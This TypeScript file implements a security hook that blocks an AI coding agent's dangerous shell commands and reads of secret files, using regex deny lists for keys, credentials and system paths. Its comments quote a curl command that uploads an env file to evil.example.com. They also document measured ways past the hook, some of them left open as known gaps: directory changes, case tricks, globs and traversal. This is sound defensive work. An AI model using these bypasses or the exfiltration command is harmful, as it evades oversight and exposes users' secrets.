/**
 * Security Blocker Hook
 *
 * TypeScript port of scripts/pre-tool-use-security.sh
 *
 * This is the SECURITY-CRITICAL hook that prevents dangerous operations.
 * It is the last line of defense against:
 * - Dangerous bash commands (rm -rf /, dd, mkfs, fork bombs)
 * - Modification of sensitive files (.env, .ssh keys, credentials)
 * - Modification of system directories (/etc, /usr, /var)
 * - Path traversal attacks (..)
 * - Symlink bypass attacks (ME-001)
 *
 * SECURITY NOTES:
 * 1. This hook BLOCKS operations - it never auto-approves
 * 2. All protected patterns from bash script are preserved EXACTLY
 * 3. Symlink resolution (ME-001 fix) checks BOTH normalized AND resolved paths
 * 4. Error messages are helpful but don't reveal sensitive information
 *
 * @module pretool/security-blocker
 */

import { FILESYSTEM_PATTERNS, matchDangerousBash } from '../lib/dangerous-bash/index.js';
import type { Match as DangerousBashMatch } from '../lib/dangerous-bash/index.js';
import {
  getAgentId,
  getAgentType,
  getCommand,
  getFilePath,
  getSessionId,
  getToolName,
  stripProxyPrefix,
} from '../lib/input.js';
import { logDebug, logPermission, logWarn } from '../lib/logging.js';
import { outputAsk, outputDeny, outputSilentSuccess, outputWarning } from '../lib/output.js';
import {
  CREDENTIAL_PATTERNS,
  ENV_PATTERNS,
  GIT_PATTERNS,
  SSH_PATTERNS,
  SYSTEM_DIR_PATTERNS,
  normalizePath,
  resolveRealPath,
} from '../lib/path-utils.js';
import type { ProtectionCategory } from '../lib/path-utils.js';
import { scannableProjection } from '../lib/shell-projection.js';
import type { AgentContext, HookInput, HookResult, ToolName } from '../types.js';

// Re-export protected path patterns and types from path-utils (single source of truth)
export { ENV_PATTERNS, GIT_PATTERNS, SSH_PATTERNS, CREDENTIAL_PATTERNS, SYSTEM_DIR_PATTERNS };

/**
 * Text appended to every denial this hook emits.
 *
 * WHY THE RAW PATTERN IS NO LONGER SHOWN (#65). Denials used to interpolate
 * `regex.source` into user-facing text, e.g. `Pattern matched: \/usr\/`. That
 * made the denial message itself contain the protected literal, so quoting a
 * denial re-triggered the block: a ledger entry describing this very trap was
 * denied for describing it.
 *
 * The pattern is still logged on all three denial paths — but only ONE of them
 * logged it before this change. On the dangerous-command and protected-path
 * paths the `reason` string carried no pattern at all, so removing it from the
 * payload would have destroyed the information rather than relocating it. Those
 * two `reason` strings were extended in the same commit; that is what makes
 * "removed from the payload, kept in the log" true rather than aspirational.
 *
 * WHY THE GUIDANCE EXISTS. This check matches the TEXT of a command, not the
 * resource the command resolves to, so a command that merely mentions a
 * protected name is denied even when it touches nothing sensitive. Naming the
 * path-based alternative converts a dead end into a next step.
 *
 * THE "NOT FATAL" SENTENCE HELPS THE MAIN THREAD ONLY. Read R1 (#51) before
 * changing it — two of its findings pull in different directions, and only the
 * first is usually quoted.
 *
 * Finding 1: the denial is "not a kill". Every denial returns a normal error
 * tool_result, and a MAIN-THREAD call that was denied "received the error and
 * continued normally". For that caller this sentence is useful.
 *
 * Finding 4 measured the opposite for SUBAGENTS, in a controlled experiment:
 * "zero assistant turns after the BLOCKED result ... The agent is never handed
 * a turn in which to react. This is harness-level termination of the subagent."
 * Those probes ignored instructions given three times that the block was
 * expected.
 *
 * So for the population that motivated this — the 7-of-12 lost subagent reports
 * — payload text is very likely INERT, because the subagent never gets a turn in
 * which to read it. #65 proposed payload delivery on the strength of Finding 1;
 * Finding 4 is evidence against it, not merely an absence of evidence. This is
 * kept because it costs nothing and helps the caller that does survive. It is
 * NOT a mitigation for the lost reports; do not cite it as one.
 */
const DENIAL_GUIDANCE =
  '\n\nThis check matches the text of the command, not the resource it resolves to. ' +
  'To inspect a file, use the Read, Grep or Glob tools — those are checked by resolved path instead.' +
  '\nThis denial is not fatal and does not end your task. Continue, and still write any report or checkpoint you owe.';
export type { ProtectionCategory };

// =============================================================================
// CONSTANTS
// =============================================================================

const HOOK_NAME = 'pre-tool-use-security';

/**
 * File operation tools that require security validation.
 */
const FILE_WRITE_TOOLS: ReadonlySet<ToolName> = new Set(['Write', 'Edit', 'MultiEdit']);

// =============================================================================
// DANGEROUS BASH COMMAND PATTERNS
// =============================================================================

/**
 * Dangerous bash command patterns that could cause system damage.
 * These commands are ALWAYS blocked.
 *
 * Backed by the categorized dangerous-bash registry in
 * `lib/dangerous-bash/`. Exported as a flat `RegExp[]` for backward
 * compatibility with consumers that iterate the legacy array shape.
 *
 * Note: this constant exposes only the `filesystem` category; the runtime
 * check in `validateBashCommand` calls `matchDangerousBash` directly so
 * additional categories (e.g., `http`) participate in matching.
 */
export const DANGEROUS_COMMAND_PATTERNS: readonly RegExp[] = FILESYSTEM_PATTERNS.map(
  (p) => p.regex
);

/**
 * Environment dump command patterns - block commands that dump all env vars.
 * These commands can leak secrets stored in process environment variables.
 *
 * Each pattern uses (?:^|\||\&\&|\;)\s* prefix to handle chained commands.
 */
export const ENV_DUMP_PATTERNS: readonly RegExp[] = [
  // printenv (with or without args, always dumps env info)
  // Compound + sudo aware (CC v2.1.98 alignment).
  // The optional absolute-path prefix matters: an invocation by full path was
  // previously caught only as a side effect of the blanket /usr/ path rule, so
  // relaxing that rule without this would have opened a real dump bypass.
  /(?:^|[|&;]\s*|sudo\s+)(?:\/(?:[\w.-]+\/)*)?printenv(?:\s|$)/,
  // env alone or piped — still NOT env VAR=val cmd, env -i, or `env python`,
  // because `env` must be followed by end-of-command or a separator.
  /(?:^|[|&;]\s*|sudo\s+)(?:\/(?:[\w.-]+\/)*)?env\s*(?:$|[|&;])/,
  // set alone or piped (but NOT set -e, set -x, set -o)
  /(?:^|[|&;]\s*|sudo\s+)set\s*(?:$|[|&;])/,
  // export -p (list all exports)
  /(?:^|[|&;]\s*|sudo\s+)export\s+-p(?:\s|$)/,
  // declare -x (list all exported vars)
  /(?:^|[|&;]\s*|sudo\s+)declare\s+-x(?:\s|$)/,
  // compgen -v (list all variable names)
  /(?:^|[|&;]\s*|sudo\s+)compgen\s+-v(?:\s|$)/,
] as const;

/**
 * Check if a command matches any environment dump pattern.
 *
 * @param command - The bash command to check
 * @returns Object with matched flag and matching pattern source (if any)
 */
export function matchesEnvDumpCommand(command: string): { matched: boolean; pattern?: string } {
  for (const pattern of ENV_DUMP_PATTERNS) {
    if (pattern.test(command)) {
      return { matched: true, pattern: pattern.source };
    }
  }
  return { matched: false };
}

/**
 * Regex matching `git push` invocations.
 *
 * Used to force an explicit user approval prompt for any push, regardless
 * of other auto-approve rules. The friction class from /insights is users
 * interrupting Claude mid-push to enforce "ask first" — gating all pushes
 * makes that intervention unnecessary.
 */
export const GIT_PUSH_REGEX = /\bgit\s+push\b/;

/**
 * Test whether a command is a `git push` invocation that warrants the
 * approval-first gate. `git push --help` is exempt (docs only).
 */
export function matchesGitPush(command: string): boolean {
  if (!GIT_PUSH_REGEX.test(command)) return false;
  if (/--help\b/.test(command)) return false;
  return true;
}

/**
 * Sensitive path patterns to block in bash commands.
 * Commands referencing these paths should require approval.
 */
/**
 * Secret-bearing files. Blocked on ANY reference, because *reading* them is
 * itself the exfiltration vector — `cat`-ing a key is the attack, not a
 * precursor to one.
 *
 * The env-file patterns carry negative lookbehinds for `process` and
 * `import.meta` so the ubiquitous code idioms `process.env` / `import.meta.env`
 * do not match. Without them the hook denied any command whose *text* merely
 * mentioned an environment variable — including commit messages describing one
 * and test files reading one — which blocked legitimate work several times and,
 * because a PreToolUse deny is terminal for a subagent, silently killed
 * multi-agent runs mid-flight.
 *
 * ⚠ THE CASE RULE (#116) — WHICH RULES CARRY `i`, AND WHY FOUR DO NOT.
 *
 * The default macOS volume is case-insensitive, so `/ETC/passwd` and
 * `~/.SSH/id_rsa` reach the same inodes as their lowercase spellings. Every
 * rule here was case-sensitive, so all of them were net AUTO-APPROVED.
 *
 * A rule carries `i` when it matches a **filesystem path component**. Four
 * rules deliberately do NOT, because their uppercase spelling is a common
 * IDENTIFIER rather than a filename, and denying it costs ordinary work. Each
 * exclusion is a MEASURED false positive, not a guess:
 *
 *   `.env` / `.envrc`   `docker inspect -f '{{.Config.Env}}'` — DENIED under a
 *                       blanket `i`. Docker's Go-template field is capitalised.
 *   `*.key|keytab|…`    `item.Key` / `pair.Key` — the .NET KeyValuePair idiom.
 *   `kubeconfig`        `export KUBECONFIG=…` — nobody writes the lowercase
 *                       form; the uppercase env var is the universal spelling.
 *   `/root`             Tomcat's default webapp is literally `webapps/ROOT/`.
 *                       ⚠ AND `i` WOULD BUY NOTHING HERE: `/root` does not
 *                       exist on macOS (root's home is `/var/root`, covered by
 *                       the `/var` rule above — verified, both spellings), and
 *                       on Linux the volume is case-sensitive so `/ROOT` is a
 *                       different path. Pure cost, zero benefit.
 *
 * ⚠ THE REMAINING COST IS NOT ZERO AND IS NOT CLAIMED TO BE. Any relative path
 * with a capitalised protected segment is newly denied. An earlier revision of
 * this comment called such spellings "contrived" and cited two invented ones;
 * review of PR #119 found REAL examples, so that wording was withdrawn — the tz
 * database's `Etc/` zone directory (`zoneinfo/Etc/UTC`) is capitalised by the
 * IANA data itself, and `src/Boot/` and `internal/Sys/` occur in ordinary trees.
 *
 * The conclusion is unchanged, and it is the reason the trade was taken: **every
 * one of these has a lowercase twin that is ALREADY denied at baseline**, because
 * the qualified rules carry no left boundary. `i` makes an existing over-broad
 * class case-consistent; it does not create one. That pre-existing class is #118,
 * not widened here — and #118 is where the real fix belongs, since it removes the
 * denial for BOTH spellings rather than restoring the asymmetry.
 *
 * ⚠ #118 IS COUPLED TO #117 — READ BOTH BEFORE TOUCHING THE QUALIFIED RULES.
 * Their missing left boundary is also the ONLY reason `/private/etc/passwd` and
 * `/private/var/root/.ssh/id_rsa` are denied today (measured). Adding the
 * boundary to fix #118's false positives converts both into real bypasses. The
 * obvious fix is the dangerous one, exactly as it was for #117.
 *
 * ⚠ `cat .ENV` STAYS OPEN, deliberately. Closing it requires `i` on the env-file
 * rules, which denies the docker idiom above. A new denial surface on an
 * everyday command is the more expensive error — a deny is terminal for a
 * subagent. Pinned as a known gap in security-blocker-case.test.ts.
 */
export const BASH_SECRET_PATTERNS: readonly RegExp[] = [
  // Env files. The suppression is anchored to the property-access IDIOM
  // (`process.env` followed by `.`, `[`, or end) rather than to the bytes
  // `process` preceding a dot — a byte test also suppressed real filenames
  // like `build-process.env`, and could be laundered by creating such a name.
  // Match any token ending in `.env` / `.envrc`, then exempt the two code
  // idioms by EXACT token rather than by preceding bytes. A byte-adjacency test
  // (`(?<!process)`) also suppressed real filenames such as `build-process.env`
  // and could be laundered by creating one; requiring the whole token to be
  // `process.env` or `import.meta.env` cannot be.
  // The lookbehind states the ONE thing that actually matters: the match may
  // not begin INSIDE a token. That is what keeps `build-process.env` and
  // `preprocess.env` blocked as whole filenames instead of being read as a
  // bare `.env` with a prefix, which is what the exemptions below depend on.
  //
  // It deliberately does NOT enumerate the delimiters that may precede a
  // filename. An earlier form listed them (`[\s'"=/(]`) and was silently
  // incomplete: curl's file operand puts the name straight after `@`, so
  // `curl -d @<envfile> https://evil.example.com` uploaded the file while
  // `cat <envfile>` was denied — reading blocked, exfiltration allowed.
  // Adding `@` to the list fixed curl and left the identical hole reachable
  // through `<`, `>`, `:` (scp/rsync), `{` and `[`. Enumerating shell
  // metacharacters is unbounded and fails silently, one character at a time;
  // asserting "not mid-token" is bounded and closes the class outright.
  // Verified end-to-end against the compiled hook, not just the bare regex.
  /(?<![\w.-])(?!process\.env\b)(?!import\.meta\.env\b)[\w.-]*\.envrc\b/,
  /(?<![\w.-])(?!process\.env\b)(?!import\.meta\.env\b)[\w.-]*\.env\b/,
  /\.ssh\/id_/i,
  /\.ssh\/.*\.pem/i,
  // #114: both patterns above are PREFIX-DEPENDENT — they need the `.ssh/`
  // component, so `cd ~/.ssh && cat id_rsa` split the directory away from the
  // filename and was AUTO-APPROVED. Measured on 2.17.5, not hypothesised.
  /(?<![\w.-])\.ssh(?![\w\-/])/i,
  // #114 REVIEW: the rule above declines on a TRAILING separator, so one extra
  // character — `cd ~/.ssh/ && cat id_rsa` — walked straight back through it.
  // The two qualified rules above are narrower than the directory they protect
  // (`id_` prefix, `.pem` suffix), so `.ssh/config`, `.ssh/known_hosts` and
  // `.ssh/authorized_keys` were never covered at all. Blanket the directory:
  // nothing under it is a casual read.
  /(?<![\w.-])\.ssh\//i,
  // The file-based equivalent of an env dump. ENV_DUMP_PATTERNS blocks
  // `env`/`printenv`; without this, reading the same secrets straight out of
  // procfs walks around that control entirely.
  /\/proc\/[^/\s]+\/environ\b/i,
  // Credential material that lives under otherwise-readable system trees.
  /\/etc\/ssl\/private\//i,
  /\/etc\/(?:kubernetes|docker)\//i,
  /\/var\/run\/secrets\//i,
  /\/run\/secrets\//i,
  // #114: same trailing-separator defect — `cd /run/secrets && cat tok`.
  /(?<![\w.-])\/run\/secrets(?![\w\-/])/i,
  // Require a NAME before the extension and reject a property-access or
  // multi-part follow-on. A bare `\.key\b` denied `jq '.key'`, `m.key(1)` and
  // `schema.key.ts` — a fresh instance of the very over-blocking this release
  // exists to fix, and a deny inside a fork is terminal.
  // ⚠ #116: NO `i` ON THE NEXT TWO — DO NOT "FIX" THE INCONSISTENCY. Measured:
  // `i` here denies `item.Key` / `pair.Key` (the .NET KeyValuePair idiom) and
  // `export KUBECONFIG=…` (the universal spelling of that env var). See the
  // CASE RULE block in this array's docstring.
  /[\w-]+\.(?:key|keytab|p12|pfx|jks)\b(?![\w(.])/,
  /\bkubeconfig\b/,
  // Credential-bearing files under /etc. The directory as a whole is only
  // mutation-gated (reading /etc/hosts is routine), but these specific entries
  // are secrets or account data and stay read-blocked.
  // #116: this rule is the flagship of the case fix — `cat /ETC/passwd` reads
  // the account file on any default macOS volume and was AUTO-APPROVED.
  /\/etc\/(?:passwd|shadow|sudoers|gshadow|master\.passwd)\b/i,
  /\/etc\/ssh\//i,
  // Another user's home directory — never a legitimate read for our purposes.
  // ⚠ #116: NO `i` ON THE NEXT TWO EITHER, and this one is the counter-intuitive
  // exclusion. `i` costs Tomcat's `webapps/ROOT/` and buys NOTHING: `/root` does
  // not exist on macOS (root's home is `/var/root`, already covered by the
  // case-insensitive `/var` rule — verified in both spellings), and Linux
  // volumes are case-sensitive, so `/ROOT` is simply a different path there.
  /\/root\//,
  // #114: `cd /root && cat k` — the bare form, with no trailing separator.
  /(?<![\w.-])\/root(?![\w\-/])/,
  // macOS temp/home trees. Kept as always-block rather than mutation-gated:
  // the scratchpad carve-out below already solves the false-positive that
  // motivated relaxing these, so there is no reason to widen read access.
  // #116: as with /var/folders above, the `i` also case-folds the claude-NNN
  // scratchpad exemption. Correct rather than widening — `/private/tmp/CLAUDE-1`
  // and `/private/tmp/claude-1` are one directory on a case-insensitive volume.
  /\/private\/tmp\/(?!claude-\d+\/)/i,
  // #114 REVIEW: this and /private/home carry the SAME trailing-separator
  // defect and were missed by the first pass, while the CHANGELOG read as a
  // complete closure. `ls /private/tmp` was AUTO-APPROVED. The bare rule never
  // fires on a qualified path, so the claude-NNN scratchpad exemption above is
  // untouched — verified, not assumed.
  /(?<![\w.-])\/private\/tmp(?![\w\-/])/i,
  // Companion guard — bash patterns match RAW command text with no `..`
  // normalization, so a traversal spelled from inside the allowed prefix
  // would otherwise slip past the lookahead above.
  /\/private\/tmp\/claude-\d+\/\S*\.\.(\/|\s|$)/i,
  /\/private\/home\//i,
  /(?<![\w.-])\/private\/home(?![\w\-/])/i,
] as const;

/**
 * System directories. Blocked on ANY reference — read included.
 *
 * ⚠ THERE IS NO MUTATION GATE, AND THERE DELIBERATELY IS NOT ONE. Until #99
 * this docstring claimed these were "blocked only when the path is the TARGET
 * of a mutating operation", and two sibling comments said the same. All three
 * were stale: they described a design that was built, demolished by adversarial
 * review, and abandoned — see the "two attempts" note below, which is the
 * accurate account. Measured on the live code: `cat /etc/hosts > out.txt`,
 * named in the old docstring as the ALLOWED case, is denied; so is `ls
 * /usr/bin`, a bare read with no verb at all.
 *
 * **Do not "restore" the gate to match a comment.** Deciding "is this path the
 * target of a write?" needs a shell parse, and the two regex attempts leaked
 * arbitrary writes to `/usr/local/bin` and `/etc/cron.d` — a PATH hijack
 * needing no sudo. Destructive use is separately covered by the dangerous-bash
 * registry, which runs first (see lib/dangerous-bash/filesystem.ts).
 */
export const BASH_SYSTEM_DIR_PATTERNS: readonly RegExp[] = [
  // #116: EVERY rule below carries `i`. The default macOS volume is
  // case-insensitive, so `/ETC/passwd` reaches the same inode as `/etc/passwd`
  // and was AUTO-APPROVED — measured, not hypothesised. See the CASE RULE block
  // above BASH_SECRET_PATTERNS for which rules are excluded and why.
  /\/etc\//i,
  /\/usr\//i,
  // #99: macOS puts each user's TMPDIR under /var/folders/, so any build,
  // installer, or test harness that writes there and then runs the result was
  // denied. That is ordinary work, not a risky operation. Narrowed rather than
  // removed — /var/log, /var/root and /var/db stay protected.
  //
  // One pattern covers BOTH spellings on purpose: /var is a symlink to
  // /private/var, and `/private/var/folders/` contains `/var/folders/` as a
  // substring, so the lookahead suppresses the private spelling too. Verified,
  // not assumed — see the both-spellings cases in security-blocker-macos-temp.
  // #116 note: the `i` makes the NEGATIVE LOOKAHEAD case-insensitive too, so
  // `/VAR/FOLDERS/` is exempted exactly like `/var/folders/`. That is correct,
  // not a widening — on the case-insensitive volume they are the same directory.
  // Verified end to end, both spellings, in security-blocker-case.test.ts.
  /\/var\/(?!folders\/)/i,
  // Partial traversal guard, mirroring the scratchpad carve-out above. It
  // catches the CONTIGUOUS form — `/var/folders/x/../../../log/system.log` —
  // which is what a build tool or installer actually emits by accident.
  //
  // ⚠ IT IS PARTIAL, AND THE PRECISE LIMITS ARE MEASURED, NOT GUESSED. An
  // earlier revision of this comment claimed it "closes" the traversal bypass.
  // It does not. `\S*` cannot cross whitespace and the `..` must be followed by
  // `/`, whitespace, or end, so ALL of these defeat it — each verified DENY
  // before the #99 narrowing and ALLOW after, and each pinned as a known gap in
  // security-blocker-macos-temp.test.ts:
  //   - a space or tab inside the path         `"…/my dir/../../../log/x"`
  //   - a `..` segment ending in a quote        `…/'..'/'..'/…`  ·  `"…/.."`
  //   - `cd <exempt> && cat ../../../log/x`     (traversal in a later segment)
  //   - traversal built through a variable      `d=<exempt>; cat $d/../…`
  //
  // This cannot be fixed by widening the regex: deciding "where does this path
  // resolve?" needs a shell parse, the same wall the abandoned mutation gate hit
  // (see the docstring above). The guard is kept because it is free and catches
  // the accidental case; it is NOT a security boundary.
  //
  // ⚠ WHAT BOUNDS THE EXPOSURE — CORRECTED (#114). An earlier revision of this
  // comment said the bound was that "BASH_SECRET_PATTERNS run first and
  // independently". **That is true of only half of them**, and the KNOWN GAPS
  // block tested exactly the two cases where it holds. The secret patterns
  // split in two:
  //   - SELF-IDENTIFYING — match on the filename alone (`.env`, `.envrc`,
  //     `kubeconfig`, `*.key|keytab|p12|pfx|jks`). A `cd` cannot separate the
  //     name from its own pattern, so these genuinely do bound the exposure.
  //   - PREFIX-DEPENDENT — need a directory component (`.ssh/id_`,
  //     `/etc/(passwd|shadow|sudoers)`, `/root/`, `/run/secrets/`,
  //     `/proc/*/environ`, `/etc/ssl/private/`). A `cd` splits the directory
  //     away from the filename and can defeat them outright.
  //
  // ⚠ "PREFIX-DEPENDENT" DOES NOT MEAN "WAS DEFEATED" — do not read the list
  // above as the casualty list. Measured on 2.17.5, 6 of 12 protections fell to
  // a `cd` split: `.ssh/id_`, the three `/etc` account files, `/run/secrets/`
  // and `/root/`. The last two named above — `/proc/*/environ` and
  // `/etc/ssl/private/` — survived INCIDENTALLY, because the `cd` target itself
  // still carries `/proc/` or `/etc/` and the system-dir rules caught it. They
  // are prefix-dependent and were not defeated; both facts are true at once.
  // The flagship casualty was `cd ~/.ssh && cat id_rsa` — AUTO-APPROVED.
  // The dangerous-bash registry still runs before both.
  /\/var\/folders\/\S*\.\.(\/|\s|$)/i,
  /\/sys\//i,
  /\/proc\//i,
  /\/boot\//i,
  // #114: every pattern above requires a TRAILING SEPARATOR, so a bare
  // directory name was unmatched and `auto-approve-safe-bash` then approved the
  // command with no prompt — `ls /etc` and `cd /etc && cat passwd` alike. Note
  // the `cd` is incidental: the defect is the bare reference, not the chaining.
  //
  // ⚠ BOTH BOUNDARIES ARE LOAD-BEARING, AND THE FIRST DRAFT HAD ONLY ONE.
  // Shipped without the LEFT lookbehind, these matched the last segment of any
  // RELATIVE path: `cat config/boot.rb` (every Rails app), `cat app/root.tsx`
  // (every Remix app), `du -sh ./var`, `ls -la ./etc` — all DENIED, and a
  // denial is terminal for a subagent. That is strictly worse than the hole
  // being closed. Found by adversarial review, reproduced, and fixed here.
  //   (?<![\w.-])  the name may not begin INSIDE a token — the same statement
  //                the env-file pattern above makes, and for the same reason.
  //   (?![\w\-/])  the name must not continue into a longer name, and must not
  //                be followed by `/` (that is the QUALIFIED rule's job).
  //
  // The precise safety property is narrower than "cannot match a qualified
  // path" — an earlier revision of this comment claimed that, and it was false
  // (`cat "/etc"/hosts` is a qualified path and does match). What is true:
  // these never match a name IMMEDIATELY followed by `/`. That is enough for
  // the #99 /var/folders exemption, which lives entirely in that space.
  //
  // ⚠ KNOWN GAPS, measured — this closes the bare spelling, NOT the class.
  // THE LIST BELOW IS NOT EXHAUSTIVE; treat it as examples, not a boundary.
  //   `cd / && cat etc/passwd`  — no protected literal appears at all
  //   `cd ~root && cat k`       — tilde-user expansion
  // Both need a shell parse, the wall this file hits everywhere.
  //
  // Adversarial review of PR #115 found further spellings that reach the same
  // resources and are net AUTO-APPROVED. All were measured PRE-EXISTING — they
  // predate #114 and this change neither introduced nor widened them — so they
  // are tracked separately rather than expanding this fix:
  //   #116  glob (`~/.s*h/*` dumps the key dir), case (`/ETC` on a
  //         case-insensitive volume), quote/brace splitting (`"/e""tc/…"`)
  //   #117  the name matched only as the LEADING path component, so
  //         `/private/etc`, `/private/var` and `/Users/../etc` are open
  // ⚠ #117 is NOT fixed by weakening the lookbehind below — that is precisely
  // what shipped the Rails/Remix false-positive blocker. Read the postscript in
  // docs/reviews/2026-08-02_114-99-coupling-investigation.md first.
  /(?<![\w.-])\/etc(?![\w\-/])/i,
  /(?<![\w.-])\/usr(?![\w\-/])/i,
  /(?<![\w.-])\/var(?![\w\-/])/i,
  /(?<![\w.-])\/sys(?![\w\-/])/i,
  /(?<![\w.-])\/proc(?![\w\-/])/i,
  /(?<![\w.-])\/boot(?![\w\-/])/i,
] as const;

/**
 * System directories. Blocked on ANY reference, as before this release.
 *
 * Two attempts were made to allow read-only access here, and adversarial review
 * demolished both. A blocklist of mutating verbs let every writer outside the
 * list through (interpreter one-liners, `sed -i`, `find -delete`, `tar -C`).
 * An allowlist of safe readers then leaked via a pipe-then-absolute-path
 * segment split (`ls | /usr/bin/tee <syspath>`) and via command substitution
 * (`cat "$(touch <syspath>)"`), because a position-0 regex was certifying a
 * segment that can hold more than one command.
 *
 * Both failures share a root cause: deciding "is this path the target of a
 * write?" requires a shell parse, and no regex over unparsed text can answer
 * it. The payoff was convenience; the failure mode was arbitrary writes to
 * `/usr/local/bin` and `/etc/cron.d` — a PATH hijack needing no sudo. That
 * trade is not worth taking, so system directories stay deny-by-default and
 * this release keeps only the narrowly-safe fixes: the env-file idiom
 * exemption, procfs, credential paths, and the absolute-path dump fix.
 */

/**
 * Legacy union kept for callers that only need "does this touch anything
 * protected", preserving the historical export surface.
 */
export const BASH_SENSITIVE_PATTERNS: readonly RegExp[] = [
  ...BASH_SECRET_PATTERNS,
  ...BASH_SYSTEM_DIR_PATTERNS,
] as const;

/**
 * Test whether a command references a protected system directory.
 *
 * ⚠ THE NAME IS A HISTORICAL ARTEFACT — this does NOT test for mutation. It
 * reports a match on ANY reference to a system-dir pattern. Until #99 this
 * docstring described segment splitting and "the earliest mutating verb",
 * and claimed `cat /etc/hosts > out.txt` was allowed while `echo x >
 * /etc/hosts` was blocked. **Both are denied**, measured on the live code —
 * the described logic was never implemented here, and the design it belongs to
 * was abandoned after adversarial review (see BASH_SYSTEM_DIR_PATTERNS).
 *
 * The name is kept because it is exported and referenced elsewhere; renaming
 * it is a separate, mechanical change. Read the body, not the name.
 */
export function matchesSystemDirMutation(command: string): {
  matched: boolean;
  pattern?: string;
} {
  for (const pattern of BASH_SYSTEM_DIR_PATTERNS) {
    if (pattern.test(command)) {
      return { matched: true, pattern: pattern.source };
    }
  }
  return { matched: false };
}

// =============================================================================
// PATTERN CATEGORY TYPES
// =============================================================================

/**
 * Result of checking if a path matches protected patterns.
 */
export interface ProtectedPathMatch {
  matched: boolean;
  category?: ProtectionCategory;
  pattern?: string;
}

/**
 * Pattern check configuration for categorized pattern matching.
 */
interface PatternCheckConfig {
  patterns: readonly RegExp[];
  category: ProtectionCategory;
  friendlyName: string;
}

/**
 * All pattern checks in order of precedence.
 */
const PATTERN_CHECKS: readonly PatternCheckConfig[] = [
  {
    patterns: ENV_PATTERNS,
    category: 'env',
    friendlyName: 'Environment file',
  },
  {
    patterns: GIT_PATTERNS,
    category: 'git',
    friendlyName: 'Git configuration',
  },
  {
    patterns: SSH_PATTERNS,
    category: 'ssh',
    friendlyName: 'SSH key/certificate',
  },
  {
    patterns: CREDENTIAL_PATTERNS,
    category: 'credential',
    friendlyName: 'Credentials file',
  },
  {
    patterns: SYSTEM_DIR_PATTERNS,
    category: 'system',
    friendlyName: 'System directory',
  },
] as const;

// =============================================================================
// BASH COMMAND NORMALIZATION
// =============================================================================

/**
 * Normalize backslash-escaped characters in a bash command for security matching.
 *
 * Bash allows backslash-escaping of flags and characters (e.g., \-rf, r\m),
 * which can bypass regex patterns that match literal flag syntax.
 * CC v2.1.98 fixed a similar bypass where backslash-escaped flags were
 * auto-allowed as read-only.
 *
 * This strips single-character backslash escapes so patterns match the
 * canonical form. Does NOT alter quoted strings or heredocs.
 *
 * @param command - Raw bash command
 * @returns Command with backslash escapes normalized
 */
export function normalizeBashEscapes(command: string): string {
  // Remove backslash before non-special characters (flags, command names)
  // Preserves \n, \t, \\ (already meaningful escapes)
  // Pattern: backslash followed by a letter, digit, or hyphen
  return command.replace(/\\([-a-zA-Z0-9_./])/g, '$1');
}

/**
 * Normalize $HOME / ${HOME} references to `~` so home-targeting dangerous
 * patterns match regardless of spelling (CC v2.1.162 alignment — deny rules
 * on home paths must also block the $HOME form).
 *
 * The lookahead restricts matches to path/word boundaries so unrelated
 * variables like $HOMEBREW_PREFIX are not mangled. Shell separators
 * (; & | ) ` < >) count as boundaries too — the separator-glued form
 * (e.g. a target glued to ;ls) must normalize the same as the
 * whitespace form (review !209 finding #1).
 *
 * @param command - Raw bash command
 * @returns Command with home references normalized to ~
 */
export function normalizeHomeRefs(command: string): string {
  return (
    command
      // Double-quoted forms expand in bash exactly like unquoted ones, but a
      // quote glued to the tilde would defeat the ~-anchored deny patterns —
      // unwrap "$HOME" / "${HOME}" / "$HOME/path" to ~ / ~/path first.
      // (Single-quoted '$HOME' is a literal in bash — deliberately untouched.)
      .replace(/"\$\{?HOME\}?"/g, '~')
      .replace(/"\$\{?HOME\}?\/([^"]*)"/g, '~/$1')
      .replace(/\$\{?HOME\}?(?=[/\s"';&|)<>`]|$)/g, '~')
  );
}

/**
 * Unwrap exec wrappers so pattern matching sees the inner command.
 *
 * CC v2.1.113 aligned its deny rules to unwrap exec wrappers before pattern
 * matching. Without this, users can bypass our security-blocker by wrapping
 * dangerous commands in `sh -c '...'`, `bash -c "..."`, or prefixing with
 * `env VAR=value`.
 *
 * Strategy: run repeatedly to handle nested wrappers (e.g.
 * `sh -c 'bash -c "rm -rf /"'`). Returns the original command unchanged if
 * no wrapper is detected.
 *
 * Patterns unwrapped:
 *   - /path/to/sh -c '<inner>' | "<inner>"
 *   - /path/to/bash -c '<inner>' | "<inner>"
 *   - sh -c <inner> | bash -c <inner>  (unquoted)
 *   - env [-i] [VAR=value ...] <cmd> <args>
 *
 * @param command - Raw (already-escape-normalized) bash command
 * @returns Inner command if wrapped, else the original
 */
export function unwrapExecWrappers(command: string): string {
  let current = command.trim();
  // Bound iterations to prevent any pathological input from looping forever
  for (let i = 0; i < 4; i++) {
    // Match: optional path prefix, then sh/bash, then -c, then a quoted or
    // unquoted argument. Also strip a leading sudo if present.
    const shBashMatch = current.match(
      /^(?:sudo\s+)?(?:\/[^\s]*\/)?(?:sh|bash|zsh|dash)\s+-c\s+(?:'([^']*)'|"([^"]*)"|(\S.*))$/
    );
    if (shBashMatch) {
      current = (shBashMatch[1] ?? shBashMatch[2] ?? shBashMatch[3] ?? '').trim();
      continue;
    }
    // Match: env [-i] [VAR=value ...] <rest>
    // Only strips VAR=value assignments; preserves the actual command afterwards.
    const envMatch = current.match(
      /^(?:sudo\s+)?env(?:\s+-i)?((?:\s+[A-Za-z_][A-Za-z0-9_]*=\S*)*)\s+(.+)$/
    );
    if (envMatch?.[2]) {
      current = envMatch[2].trim();
      continue;
    }
    break;
  }
  return current;
}

// =============================================================================
// BASH COMMAND VALIDATION
// =============================================================================

/**
 * Check if a command matches any dangerous command patterns.
 *
 * Walks the categorized dangerous-bash registry (filesystem + http). The
 * returned `pattern` field is the matched regex source for backward
 * compatibility with the pre-registry signature.
 *
 * @param command - The bash command to check
 * @returns Object with matched flag and matching pattern source (if any)
 */
export function matchesDangerousCommand(command: string): { matched: boolean; pattern?: string } {
  const match = matchDangerousBash(command);
  if (match) {
    return { matched: true, pattern: match.pattern.regex.source };
  }
  return { matched: false };
}

/**
 * Check if a command references sensitive paths.
 *
 * @param command - The bash command to check
 * @returns Object with matched flag and matching pattern source (if any)
 */
export function matchesBashSensitivePattern(command: string): {
  matched: boolean;
  pattern?: string;
} {
  // #65: scan the projection, not the raw text. Provably-inert regions (quoted
  // heredoc bodies, comments, echo/printf operands, a `git commit` message, a
  // grep PATTERN operand, `case` patterns) are blanked first; every pattern
  // below is unchanged and still matches exactly what it matched before.
  //
